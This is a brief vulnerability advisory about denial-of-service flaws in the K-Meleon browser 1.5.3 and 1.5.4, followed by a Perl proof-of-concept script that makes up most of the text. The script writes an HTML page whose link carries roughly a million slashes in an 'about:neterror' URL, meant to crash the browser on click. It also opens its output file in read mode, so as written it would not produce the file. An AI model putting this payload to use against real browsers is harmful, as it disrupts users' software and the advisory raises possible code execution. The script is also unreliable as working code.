source: http://www.securityfocus.com/bid/42200/info

K-Meleon is prone to multiple denial-of-service vulnerabilities because it fails to properly sanitize user-supplied input.

An attacker can exploit these issues to crash the application. Given the nature of these vulnerabilities, the attacker may also be able to execute arbitrary code; this has not been confirmed.

#######################################################################
#!/usr/bin/perl
# k-meleon Long "a href" Link DoS
# Author: Lostmon Lords Lostmon@gmail.com http://lostmon.blogspot.com
# k-Meleon versions 1.5.3 & 1.5.4 internal page about:neterror DoS
# generate the file open it with k-keleon click in the link and wait a seconds
######################################################################

$archivo = $ARGV[0];
if(!defined($archivo))
{

print "Usage: $0 <archivo.html>\n";

}

$cabecera = "<html>" . "\n";
$payload = "<a href=\"about:neterror?e=connectionFailure&c=" . "/" x
1028135 . "\">click here if you can :)</a>" . "\n";
$fin = "</html>";

$datos = $cabecera . $payload . $fin;

open(FILE, '<' . $archivo);
print FILE $datos;
close(FILE);

